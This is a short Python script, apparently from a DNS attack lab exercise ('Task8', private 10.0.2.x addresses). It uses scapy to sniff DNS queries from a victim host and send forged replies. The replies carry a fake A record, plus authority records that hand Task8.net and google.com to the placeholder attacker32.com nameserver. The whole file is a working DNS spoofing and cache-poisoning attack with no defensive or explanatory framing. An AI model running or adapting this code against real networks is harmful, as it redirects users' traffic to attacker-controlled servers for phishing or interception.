#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
        if (DNS in pkt and b'www.Task8.net' in pkt[DNS].qd.qname):
                IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='1.2.3.8')
                NSsec1 = DNSRR(rrname='Task8.net', type='NS',ttl=259200, rdata='attacker32.com')
                NSsec2 = DNSRR(rrname='google.com', type='NS',ttl=259200, rdata='attacker32.com')
                Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',ttl=259200, rdata='10.0.2.15')
                DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                 qdcount=1,ancount=1,nscount=2,arcount=1,an=Anssec, ns=NSsec2/NSsec1, ar=Addsec1)
                spoofpkt = IPpkt/UDPpkt/DNSpkt
                send(spoofpkt)

pkt = sniff(filter='udp and dst port 53 and src host 10.0.2.7', prn=spoof_dns)
